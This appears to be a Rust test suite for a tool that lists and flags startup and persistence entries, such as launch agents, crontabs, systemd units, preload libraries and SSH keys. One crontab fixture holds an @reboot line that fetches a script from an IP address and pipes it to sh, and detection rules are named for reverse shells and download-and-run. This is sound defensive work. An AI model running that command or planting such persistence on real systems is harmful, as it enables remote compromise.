use super::*;
use crate::{Appearance, Msg, Settings, Startup, ThemeChoice, update};
use borg_rules::Level;
use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
use std::time::Duration;

const UPDATER: &[u8] = include_bytes!("fixtures/updater.plist");
const UPDATER_BINARY: &[u8] = include_bytes!("fixtures/updater.binary.plist");
const BACKUP: &[u8] = include_bytes!("fixtures/backup.plist");
const CRONTAB: &[u8] = include_bytes!("fixtures/crontab");
const SYSTEM_CRONTAB: &[u8] = include_bytes!("fixtures/system-crontab");
const ANACRONTAB: &[u8] = include_bytes!("fixtures/anacrontab");
const SERVICE: &[u8] = include_bytes!("fixtures/notes-sync.service");
const TIMER: &[u8] = include_bytes!("fixtures/notes-sync.timer");
const DESKTOP: &[u8] = include_bytes!("fixtures/chat.desktop");
const RC_LOCAL: &[u8] = include_bytes!("fixtures/rc.local");
const PRELOAD: &[u8] = include_bytes!("fixtures/ld.so.preload");
const AUTHORIZED_KEYS: &[u8] = include_bytes!("fixtures/authorized_keys");
const ZSHRC: &[u8] = include_bytes!("fixtures/zshrc");
const HOME: &str = "/home/sam";

fn one(format: StartupFormat, name: &str, bytes: &[u8]) -> StartupEntry {
    let mut found = parse(format, name, bytes);
    assert_eq!(found.len(), 1, "{name}: {found:?}");
    found.remove(0)
}

#[test]
fn xml_plists_read_dicts_arrays_entities_and_skip_comments() {
    let value = plist::parse(UPDATER).unwrap();
    assert_eq!(value.get("Label").and_then(plist::Value::text), Some("com.example.updater"));
    let Some(plist::Value::Array(arguments)) = value.get("ProgramArguments") else { panic!("{value:?}") };
    assert_eq!(arguments[2], plist::Value::String("--server=a & b".into()));
    assert_eq!(value.get("StartInterval"), Some(&plist::Value::Integer(300)));
    assert_eq!(value.get("KeepAlive").and_then(plist::Value::flag), Some(false));
    let environment = value.get("EnvironmentVariables").unwrap();
    assert_eq!(environment.get("LANG").and_then(plist::Value::text), Some("C"));
}

/// A plist with every dictionary's keys in order, since tools write them in any order.
fn sorted(value: plist::Value) -> plist::Value {
    match value {
        plist::Value::Dict(entries) => {
            let mut entries: Vec<_> = entries.into_iter().map(|(key, value)| (key, sorted(value))).collect();
            entries.sort_by(|a, b| a.0.cmp(&b.0));
            plist::Value::Dict(entries)
        }
        plist::Value::Array(items) => plist::Value::Array(items.into_iter().map(sorted).collect()),
        value => value,
    }
}

#[test]
fn binary_plists_read_as_the_xml_they_were_made_from() {
    assert_eq!(plist::parse(UPDATER_BINARY).map(sorted), plist::parse(UPDATER).map(sorted));
}

#[test]
fn broken_plists_read_as_nothing_without_panicking() {
    for end in 0..UPDATER_BINARY.len() {
        let _ = plist::parse(&UPDATER_BINARY[..end]);
    }
    for end in 0..UPDATER.len() {
        let _ = plist::parse(&UPDATER[..end]);
    }
    let mut cycle = UPDATER_BINARY.to_vec();
    let last = cycle.len() - 1;
    cycle[last] ^= 0xFF;
    let _ = plist::parse(&cycle);
    assert_eq!(plist::parse(b"<plist><dict><key>Label</key></plist>"), None);
    assert_eq!(parse(StartupFormat::Launchd, "broken.plist", b"not a plist"), Vec::new());
}

#[test]
fn launch_agents_run_their_program_arguments_and_say_when() {
    let found = one(StartupFormat::Launchd, "com.example.updater.plist", UPDATER);
    assert_eq!(found.name, "com.example.updater");
    assert_eq!(found.program.as_deref(), Some("/tmp/.cache/updater"));
    assert_eq!(found.runs, "/tmp/.cache/updater --daemon '--server=a & b'");
    assert_eq!(found.when.as_deref(), Some("RunAtLoad, StartInterval 300"));
    assert!(!found.disabled);
    assert_eq!(one(StartupFormat::Launchd, "com.example.updater.plist", UPDATER_BINARY), found);
}

#[test]
fn a_launchd_program_key_wins_over_the_first_argument() {
    let found = one(StartupFormat::Launchd, "org.example.backup.plist", BACKUP);
    assert_eq!(found.program.as_deref(), Some("/usr/local/bin/backup"));
    assert_eq!(found.runs, "/usr/local/bin/backup --quiet");
    assert_eq!(found.user.as_deref(), Some("root"));
    assert_eq!(found.when.as_deref(), Some("StartCalendarInterval"));
    assert!(found.disabled);
}

#[test]
fn crontabs_skip_variables_and_read_schedules_and_commands() {
    let found = parse(StartupFormat::Crontab, "sam", CRONTAB);
    let summary: Vec<_> = found
        .iter()
        .map(|found| (found.line, found.when.as_deref(), found.program.as_deref(), found.name.as_str()))
        .collect();
    assert_eq!(
        summary,
        [
            (Some(5), Some("*/15 * * * *"), Some("/home/sam/bin/sync-notes.sh"), "sync-notes.sh"),
            (Some(6), Some("@reboot"), Some("curl"), "curl"),
            (Some(7), Some("0 4 * * 1"), Some("/opt/tools/report"), "report"),
        ]
    );
    assert_eq!(found[1].runs, "curl -fsSL http://203.0.113.7/a.sh | sh");
    assert_eq!(found[0].user, None);
}

#[test]
fn system_crontabs_name_the_user_before_the_command() {
    let found = parse(StartupFormat::SystemCrontab, "crontab", SYSTEM_CRONTAB);
    assert_eq!(found.len(), 2);
    assert_eq!(found[0].user.as_deref(), Some("root"));
    assert_eq!(found[0].runs, "cd / && run-parts --report /etc/cron.hourly");
    assert_eq!(found[0].program.as_deref(), Some("cd"));
    assert_eq!((found[1].when.as_deref(), found[1].user.as_deref()), (Some("@daily"), Some("backup")));
    assert_eq!(found[1].program.as_deref(), Some("/usr/local/bin/backup"));
}

#[test]
fn anacrontab_jobs_have_a_period_a_name_and_a_command() {
    let found = parse(StartupFormat::Anacrontab, "anacrontab", ANACRONTAB);
    let summary: Vec<_> = found
        .iter()
        .map(|found| (found.line, found.name.as_str(), found.when.as_deref(), found.runs.as_str()))
        .collect();
    assert_eq!(
        summary,
        [
            (Some(3), "cron.daily", Some("1"), "run-parts --report /etc/cron.daily"),
            (Some(4), "cron.monthly", Some("@monthly"), "run-parts --report /etc/cron.monthly"),
        ]
    );
}

#[test]
fn services_run_their_first_exec_start_across_continued_lines() {
    let found = one(StartupFormat::Unit, "notes-sync.service", SERVICE);
    assert_eq!(found.line, Some(7));
    assert_eq!(found.runs, "/usr/bin/env NOTES=1 /opt/notes/sync --watch");
    assert_eq!(found.program.as_deref(), Some("/opt/notes/sync"));
    assert_eq!(found.user.as_deref(), Some("sam"));
    assert_eq!(found.when.as_deref(), Some("WantedBy=default.target"));
}

#[test]
fn timers_name_the_service_they_start_and_when() {
    let found = one(StartupFormat::Unit, "notes-sync.timer", TIMER);
    assert_eq!(found.runs, "notes-sync.service");
    assert_eq!(found.program, None);
    assert_eq!(found.when.as_deref(), Some("OnCalendar=hourly, OnBootSec=5min"));
    let unnamed = one(StartupFormat::Unit, "cleanup.timer", b"[Timer]\nOnBootSec=1h\n");
    assert_eq!(unnamed.runs, "cleanup.service");
    assert_eq!(parse(StartupFormat::Unit, "idle.service", b"[Service]\nType=oneshot\n"), Vec::new());
    let reset =
        one(StartupFormat::Unit, "reset.service", b"[Service]\nExecStart=/bin/a\nExecStart=\nExecStart=/bin/b\n");
    assert_eq!(reset.program.as_deref(), Some("/bin/b"));
}

#[test]
fn autostart_entries_drop_field_codes_and_honour_their_switches() {
    let found = one(StartupFormat::Desktop, "chat.desktop", DESKTOP);
    assert_eq!(found.name, "Example Chat");
    assert_eq!(found.runs, "/opt/chat/chat --minimized");
    assert_eq!(found.program.as_deref(), Some("/opt/chat/chat"));
    assert_eq!(found.line, Some(4));
    assert!(found.disabled);
    let hidden = one(StartupFormat::Desktop, "tray.desktop", b"[Desktop Entry]\nExec=tray 100%%\nHidden=true\n");
    assert_eq!((hidden.name.as_str(), hidden.runs.as_str(), hidden.disabled), ("tray", "tray 100%", true));
}

#[test]
fn scripts_show_their_commands_and_the_first_program() {
    let found = one(StartupFormat::Script, "rc.local", RC_LOCAL);
    assert_eq!(found.runs, "/opt/agent/agentd --background &; echo 1 > /proc/sys/net/ipv4/ip_forward");
    assert_eq!(found.program.as_deref(), Some("/opt/agent/agentd"));
    let shell = one(StartupFormat::Shell, ".zshrc", ZSHRC);
    assert_eq!(shell.runs, "export PATH=\"$HOME/bin:$PATH\"; alias ll='ls -l'; source ~/.config/prompt.zsh");
    assert_eq!(shell.program, None);
}

#[test]
fn every_preloaded_library_is_an_item() {
    let found = parse(StartupFormat::Preload, "ld.so.preload", PRELOAD);
    let libraries: Vec<_> = found.iter().map(|found| (found.line, found.program.as_deref())).collect();
    assert_eq!(
        libraries,
        [
            (Some(2), Some("/usr/lib/libexample-hook.so")),
            (Some(3), Some("/lib/libfirst.so")),
            (Some(3), Some("/lib/libsecond.so")),
        ]
    );
}

#[test]
fn authorized_keys_show_options_and_forced_commands_without_the_key() {
    let found = parse(StartupFormat::AuthorizedKeys, "authorized_keys", AUTHORIZED_KEYS);
    assert_eq!(found.len(), 3);
    assert_eq!((found[0].name.as_str(), found[0].runs.as_str()), ("sam@laptop", "ssh-ed25519 … sam@laptop"));
    assert_eq!(found[0].program, None);
    assert_eq!(found[1].name, "backup@nas");
    assert_eq!(found[1].program.as_deref(), Some("/usr/local/bin/backup-receive"));
    assert!(found[1].runs.starts_with("from=\"198.51.100.0/24\",command="), "{}", found[1].runs);
    assert!(found[1].runs.ends_with("no-pty ssh-rsa … backup@nas"), "{}", found[1].runs);
    assert_eq!((found[2].name.as_str(), found[2].line), ("ecdsa-sha2-nistp256", Some(4)));
}

#[test]
fn programs_are_the_first_word_after_assignments_and_wrappers() {
    let cases = [
        ("/usr/bin/true", Some("/usr/bin/true")),
        ("LANG=C exec nohup /opt/x/run -v", Some("/opt/x/run")),
        ("env -i PATH=/usr/bin /bin/sh -c 'id'", Some("/bin/sh")),
        ("'/opt/my app/run' --flag", Some("/opt/my app/run")),
        ("\"$HOME\"/bin/tool", None),
        ("$(which curl) http://example.com", None),
        ("> /tmp/log", None),
        ("", None),
    ];
    for (command, program) in cases {
        assert_eq!(program_of(command).as_deref(), program, "{command}");
    }
}

#[test]
fn places_cover_each_system_and_mark_the_sealed_volume() {
    let home = Path::new(HOME);
    let macos = spots(StartupSystem::MacOs, home);
    let sealed: Vec<_> =
        macos.iter().filter(|spot| spot.read_only).map(|spot| (spot.place, spot.path.as_path())).collect();
    assert_eq!(
        sealed,
        [
            (StartupPlace::SystemAgent, Path::new("/System/Library/LaunchAgents")),
            (StartupPlace::SystemDaemon, Path::new("/System/Library/LaunchDaemons")),
        ]
    );
    assert!(macos.iter().any(|spot| spot.path == home.join("Library/LaunchAgents") && spot.folder));
    assert!(macos.iter().any(|spot| spot.path == home.join(".ssh/authorized_keys")));
    assert!(!macos.iter().any(|spot| spot.place == StartupPlace::Preload));
    let linux = spots(StartupSystem::Linux, home);
    for place in [
        StartupPlace::Service,
        StartupPlace::UserService,
        StartupPlace::Autostart,
        StartupPlace::Anacron,
        StartupPlace::RcLocal,
        StartupPlace::Preload,
    ] {
        assert!(linux.iter().any(|spot| spot.place == place), "{place:?}");
    }
    assert!(linux.iter().all(|spot| !spot.read_only));
    assert!(linux.iter().any(|spot| spot.path == home.join(".zshrc")));
}

#[test]
fn folders_take_their_own_kind_of_file_and_timers_are_timers() {
    let units = spots(StartupSystem::Linux, Path::new(HOME))
        .into_iter()
        .find(|spot| spot.place == StartupPlace::Service)
        .unwrap();
    assert!(units.takes("notes-sync.service") && units.takes("notes-sync.timer"));
    assert!(!units.takes("notes-sync.socket") && !units.takes(".hidden.service") && !units.takes("a.service~"));
    assert_eq!(units.place_of(Path::new("/etc/systemd/system/notes-sync.timer")), StartupPlace::Timer);
    assert_eq!(units.place_of(Path::new("/etc/systemd/system/notes-sync.service")), StartupPlace::Service);
    let cron = spots(StartupSystem::Linux, Path::new(HOME))
        .into_iter()
        .find(|spot| spot.path == Path::new("/etc/cron.d"))
        .unwrap();
    assert!(cron.takes("certbot") && !cron.takes("certbot.dpkg-old") && !cron.takes(".placeholder"));
}

fn item(place: StartupPlace, file: &str, line: Option<usize>, seconds: Option<u64>) -> StartupItem {
    let spot = StartupSpot {
        place,
        format: StartupFormat::Script,
        path: PathBuf::from(file),
        folder: false,
        extensions: &[],
        read_only: false,
    };
    let found = StartupEntry {
        line,
        name: file.rsplit('/').next().unwrap().into(),
        runs: file.into(),
        ..StartupEntry::default()
    };
    StartupItem {
        modified: seconds.map(|seconds| SystemTime::UNIX_EPOCH + Duration::from_secs(seconds)),
        ..StartupItem::new(&spot, file.into(), found)
    }
}

fn hit(rule: &str, level: Level, in_program: bool) -> RuleHit {
    RuleHit {
        rule: RuleMatch {
            rule: rule.into(),
            namespace: borg_rules::BUILT_IN.into(),
            level,
            description: None,
            false_positives: None,
            evidence: None,
        },
        in_program,
    }
}

#[test]
fn newest_changes_come_first_and_unknown_times_last() {
    let mut items = vec![
        item(StartupPlace::ShellStartup, "/home/sam/.zshrc", None, Some(100)),
        item(StartupPlace::Crontab, "/var/spool/cron/crontabs/sam", Some(2), None),
        item(StartupPlace::Crontab, "/etc/crontab", Some(9), Some(300)),
        item(StartupPlace::Crontab, "/etc/crontab", Some(4), Some(300)),
        item(StartupPlace::UserAgent, "/home/sam/Library/LaunchAgents/b.plist", None, Some(300)),
        item(StartupPlace::AuthorizedKey, "/home/sam/.ssh/authorized_keys", Some(1), Some(200)),
    ];
    newest_first(&mut items);
    let order: Vec<_> = items.iter().map(|item| (item.file.to_string_lossy().into_owned(), item.found.line)).collect();
    assert_eq!(
        order,
        [
            ("/home/sam/Library/LaunchAgents/b.plist".to_owned(), None),
            ("/etc/crontab".to_owned(), Some(4)),
            ("/etc/crontab".to_owned(), Some(9)),
            ("/home/sam/.ssh/authorized_keys".to_owned(), Some(1)),
            ("/home/sam/.zshrc".to_owned(), None),
            ("/var/spool/cron/crontabs/sam".to_owned(), Some(2)),
        ]
    );
}

#[test]
fn the_filter_keeps_items_with_every_word_and_none_after_a_bang() {
    let mut agent =
        item(StartupPlace::UserAgent, "/home/sam/Library/LaunchAgents/com.example.updater.plist", None, Some(1));
    agent.presence = ProgramPresence::Missing;
    agent.hits = vec![hit("launch_agent_from_temp", Level::Warning, false)];
    agent.owner = Some("sam".into());
    let keys = item(StartupPlace::AuthorizedKey, "/home/sam/.ssh/authorized_keys", Some(1), Some(2));
    let profile = item(StartupPlace::ShellStartup, "/etc/profile", None, Some(3));
    let items = [agent, keys, profile];
    assert_eq!(filtered(&items, ""), [0, 1, 2]);
    assert_eq!(filtered(&items, "SAM"), [0, 1]);
    assert_eq!(filtered(&items, "sam !ssh"), [0]);
    assert_eq!(filtered(&items, "launch_agent"), [0]);
    assert_eq!(filtered(&items, &ProgramPresence::Missing.label().to_lowercase()), [0]);
    assert_eq!(filtered(&items, "ssh-authorized-key"), [1]);
    assert_eq!(filtered(&items, "profile !"), [2]);
}

#[test]
fn rule_names_are_listed_once_and_the_worst_level_counts() {
    let mut agent = item(StartupPlace::Agent, "/Library/LaunchAgents/a.plist", None, None);
    agent.hits = vec![
        hit("download_and_run", Level::Notice, false),
        hit("reverse_shell", Level::Alert, true),
        hit("download_and_run", Level::Notice, true),
    ];
    assert_eq!(agent.rule_names(), ["download_and_run", "reverse_shell"]);
    assert_eq!(agent.worst(), Some(Level::Alert));
    let report =
        StartupReport { items: vec![agent, item(StartupPlace::Agent, "/x", None, None)], ..StartupReport::default() };
    assert_eq!(report.matched(), 1);
}

fn state() -> (AppState, Instant) {
    let now = Instant::now();
    let (mut state, _) = AppState::new(
        Startup::at("/work".into()),
        120,
        32,
        Settings::default(),
        Appearance::new(vec![ThemeChoice { id: "midnight".into(), name: "Midnight".into() }], 0),
        now,
    );
    state.settings.preferences.git_plugin = false;
    (state, now)
}

fn press(state: &mut AppState, code: KeyCode, modifiers: KeyModifiers) -> Vec<Effect> {
    update(state, Msg::Key(KeyEvent::new(code, modifiers)), state.epoch)
}

fn requested(effects: &[Effect]) -> Option<u64> {
    effects.iter().find_map(|effect| match effect {
        Effect::StartupItems { id } => Some(*id),
        _ => None,
    })
}

fn report() -> StartupReport {
    let mut items = vec![
        item(StartupPlace::UserAgent, "/home/sam/Library/LaunchAgents/com.example.updater.plist", None, Some(500)),
        item(StartupPlace::Crontab, "/var/spool/cron/crontabs/sam", Some(6), Some(400)),
        item(StartupPlace::AuthorizedKey, "/home/sam/.ssh/authorized_keys", Some(2), Some(300)),
    ];
    newest_first(&mut items);
    StartupReport { items, ..StartupReport::default() }
}

fn opened() -> (AppState, Instant) {
    let (mut state, now) = state();
    let id = requested(&press(&mut state, KeyCode::Char('u'), KeyModifiers::ALT)).unwrap();
    assert!(state.startup_items.is_open() && state.monitor_open());
    update(&mut state, Msg::StartupItems { id, result: Ok(report()) }, now);
    (state, now)
}

#[test]
fn alt_u_opens_the_screen_reads_the_places_and_closes_it_again() {
    let (mut state, now) = state();
    let first = requested(&press(&mut state, KeyCode::Char('u'), KeyModifiers::ALT)).unwrap();
    assert_eq!(state.startup_items.side, Some(state.active));
    assert!(!state.startup_items.loaded);
    update(&mut state, Msg::StartupItems { id: first + 1, result: Ok(report()) }, now);
    assert!(!state.startup_items.loaded, "an answer to another request is dropped");
    update(&mut state, Msg::StartupItems { id: first, result: Ok(report()) }, now);
    assert_eq!(state.startup_items.len(), 3);
    assert_eq!(state.startup_items.selected().unwrap().place, StartupPlace::UserAgent);
    press(&mut state, KeyCode::Char('u'), KeyModifiers::ALT);
    assert!(!state.startup_items.is_open());
}

#[test]
fn opening_another_monitor_closes_the_screen() {
    let (mut state, _) = opened();
    press(&mut state, KeyCode::Char('n'), KeyModifiers::ALT);
    assert!(state.network.is_open() && !state.startup_items.is_open());
    press(&mut state, KeyCode::Char('u'), KeyModifiers::ALT);
    assert!(state.startup_items.is_open() && !state.network.is_open());
    press(&mut state, KeyCode::Char('m'), KeyModifiers::ALT);
    assert!(state.activity.side.is_some() && !state.startup_items.is_open());
}

#[test]
fn reading_again_keeps_the_cursor_on_its_item() {
    let (mut state, now) = opened();
    press(&mut state, KeyCode::End, KeyModifiers::NONE);
    assert_eq!(state.startup_items.selected().unwrap().place, StartupPlace::AuthorizedKey);
    let id = requested(&press(&mut state, KeyCode::Char('r'), KeyModifiers::NONE)).unwrap();
    let mut newer = report();
    newer.items.insert(0, item(StartupPlace::Daemon, "/Library/LaunchDaemons/new.plist", None, Some(900)));
    update(&mut state, Msg::StartupItems { id, result: Ok(newer) }, now);
    assert_eq!(
        (state.startup_items.cursor(), state.startup_items.selected().unwrap().place),
        (3, StartupPlace::AuthorizedKey)
    );
}

#[test]
fn typing_a_filter_narrows_the_list_and_esc_clears_it_then_closes() {
    let (mut state, _) = opened();
    press(&mut state, KeyCode::Char('/'), KeyModifiers::NONE);
    for c in "ssh".chars() {
        press(&mut state, KeyCode::Char(c), KeyModifiers::NONE);
    }
    assert_eq!(state.startup_items.len(), 1);
    press(&mut state, KeyCode::Enter, KeyModifiers::NONE);
    assert!(!state.startup_items.filtering);
    press(&mut state, KeyCode::Esc, KeyModifiers::NONE);
    assert_eq!((state.startup_items.len(), state.startup_items.is_open()), (3, true));
    press(&mut state, KeyCode::Esc, KeyModifiers::NONE);
    assert!(!state.startup_items.is_open());
}

#[test]
fn enter_shows_the_item_file_in_its_panel_and_f3_views_it() {
    let (mut state, _) = opened();
    press(&mut state, KeyCode::Down, KeyModifiers::NONE);
    let viewed = press(&mut state, KeyCode::F(3), KeyModifiers::NONE);
    assert!(
        viewed.iter().any(
            |effect| matches!(effect, Effect::View { path, .. } if path == Path::new("/var/spool/cron/crontabs/sam"))
        ),
        "{viewed:?}"
    );
    state.viewer = None;
    state.opening = None;
    let side = state.startup_items.side.unwrap();
    let shown = press(&mut state, KeyCode::Enter, KeyModifiers::NONE);
    assert!(!state.startup_items.is_open());
    assert!(
        shown.iter().any(|effect| matches!(
            effect,
            Effect::List { side: listed, dir, .. } if *listed == side && dir == Path::new("/var/spool/cron/crontabs")
        )),
        "{shown:?}"
    );
}

#[test]
fn ctrl_c_copies_what_the_item_runs() {
    let (mut state, _) = opened();
    let effects = press(&mut state, KeyCode::Char('c'), KeyModifiers::CONTROL);
    let runs = state.startup_items.selected().unwrap().found.runs.clone();
    assert_eq!(effects, [Effect::Copy(runs)]);
}

#[test]
fn a_failed_read_is_shown_and_the_list_stays() {
    let (mut state, now) = opened();
    let id = requested(&press(&mut state, KeyCode::Char('r'), KeyModifiers::NONE)).unwrap();
    update(&mut state, Msg::StartupItems { id, result: Err("no home folder".into()) }, now);
    assert_eq!(state.startup_items.error.as_deref(), Some("no home folder"));
    assert_eq!(state.startup_items.len(), 3);
}

/// A binary property list of lists that each name the next one many times: a few hundred bytes
/// that stand for more objects than could ever be read.
fn nested_lists(levels: usize) -> Vec<u8> {
    const ITEMS: u8 = 14;
    const ARRAY: u8 = 0xA0;
    const TRUE: u8 = 0x09;
    const OFFSET_SIZE: u8 = 2;
    const REFERENCE_SIZE: u8 = 2;
    let mut bytes = b"bplist00".to_vec();
    let mut offsets = Vec::new();
    for level in 0..levels {
        offsets.push(bytes.len() as u16);
        bytes.push(ARRAY | ITEMS);
        for _ in 0..ITEMS {
            bytes.extend((level as u16 + 1).to_be_bytes());
        }
    }
    offsets.push(bytes.len() as u16);
    bytes.push(TRUE);
    let table = bytes.len() as u64;
    bytes.extend(offsets.iter().flat_map(|offset| offset.to_be_bytes()));
    bytes.extend([0, 0, 0, 0, 0, 0, OFFSET_SIZE, REFERENCE_SIZE]);
    bytes.extend((offsets.len() as u64).to_be_bytes());
    bytes.extend(0u64.to_be_bytes());
    bytes.extend(table.to_be_bytes());
    bytes
}

#[test]
fn a_small_plist_that_stands_for_countless_objects_reads_as_nothing_at_once() {
    assert!(matches!(plist::parse(&nested_lists(1)), Some(plist::Value::Array(items)) if items.len() == 14));
    assert_eq!(plist::parse(&nested_lists(40)), None);
}

#[test]
fn the_context_menu_on_a_startup_item_copies_its_file_and_views_it() {
    let (mut state, now) = opened();
    let file = Path::new("/home/sam/Library/LaunchAgents/com.example.updater.plist");
    press(&mut state, KeyCode::F(10), KeyModifiers::SHIFT);
    let copied = press(&mut state, KeyCode::Enter, KeyModifiers::NONE);
    assert!(copied.iter().any(|effect| matches!(effect, Effect::Copy(text) if Path::new(text) == file)));
    press(&mut state, KeyCode::F(10), KeyModifiers::SHIFT);
    let viewed = crate::context_menu::choose_labelled(&mut state, "View", now);
    assert!(viewed.iter().any(|effect| matches!(effect, Effect::View { path, .. } if path == file)));
}
